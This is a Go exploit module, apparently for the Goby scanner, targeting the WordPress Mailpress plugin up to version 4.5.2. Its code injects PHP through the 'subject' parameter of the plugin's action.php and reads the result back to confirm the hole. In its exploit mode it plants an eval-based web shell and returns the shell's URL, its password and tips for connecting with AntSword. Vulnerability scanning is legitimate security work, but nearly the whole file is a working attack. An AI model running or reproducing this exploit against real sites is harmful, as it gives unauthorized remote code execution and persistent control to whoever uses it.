package exploits

import (
	"crypto/md5"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"regexp"
	"strings"
)

func init() {
	expJson := `{
    "Name": "WordPress Plugin Mailpress 4.5.2 RCE",
    "Description": "In the WordPress Mailpress Plugin, the subject parameter in the iview function in the mailpress/mp-includes/class/MP_Actions.class.php file is not filtered, and pass to do_eval function, leading to remote code execution.\n",
    "Product": "WordPress Plugin Mailpress <= 4.5.2",
    "Homepage": "https://wordpress.org/plugins/mailpress/",
    "DisclosureDate": "2016-12-13",
    "Author": "ovi3",
    "GobyQuery": "app=\"WordPress\"",
    "Level": "3",
    "Impact": "",
    "Recommendation": "<p>undefined</p>",
    "References": [
        "https://github.com/Medicean/VulApps/tree/master/w/wordpress/2"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "getshell"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "rce"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": [
            "WordPress"
        ],
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "Disable": false,
    "PocId": "10213"
}`

	execPhpCode := func(u *httpclient.FixUrl, phpCode string) (string, string) {
		uri := "/wp-content/plugins/mailpress/mp-includes/action.php"
		cfg := httpclient.NewPostRequestConfig(uri)
		cfg.VerifyTls = false
		cfg.FollowRedirect = false
		cfg.Header.Store("Content-type", "application/x-www-form-urlencoded")
		cfg.Data = `action=autosave&id=0&revision=-1&toemail=&toname=&fromemail=&fromname=&to_list=1&Theme=&subject=` + url.QueryEscape(`<?php `+phpCode+`;?>`) + `&html=&plaintext=&mail_format=standard&autosave=1`
		if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
			if m := regexp.MustCompile(`<autosave id=['"](\d+)['"]`).FindStringSubmatch(resp.RawBody); len(m) > 0 {
				webshellUrl := u.FixedHostInfo + "/wp-content/plugins/mailpress/mp-includes/action.php?action=iview&id=" + m[1]
				if resp2, err := httpclient.SimpleGet(webshellUrl); err == nil {
					return webshellUrl, resp2.RawBody
				}
			}
		}
		return "", ""
	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randStr := goutils.RandomHexString(5)
			phpCode := `var_dump(md5("` + randStr + `"));` // 不能加unlink，因为这是代码注入，而不是单独的webshell文件
			_, content := execPhpCode(u, phpCode)
			return strings.Contains(content, fmt.Sprintf("%x", md5.Sum([]byte(randStr))))
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			randStr := "p" + goutils.RandomHexString(5)
			phpCode := `var_dump(md5("` + randStr + `"));` + `@eval($_POST["` + randStr + `"]);`
			webshellUrl, content := execPhpCode(expResult.HostInfo, phpCode)
			if strings.Contains(content, fmt.Sprintf("%x", md5.Sum([]byte(randStr)))) {
				expResult.Success = true
				expResult.Output = "webshell url: " + webshellUrl + "\npass: " + randStr + "\nUsing AntSword to connect, choose Encoder to chr, cause these chars are not allowed: ', \" and so on"
			}
			return expResult
		},
	))
}
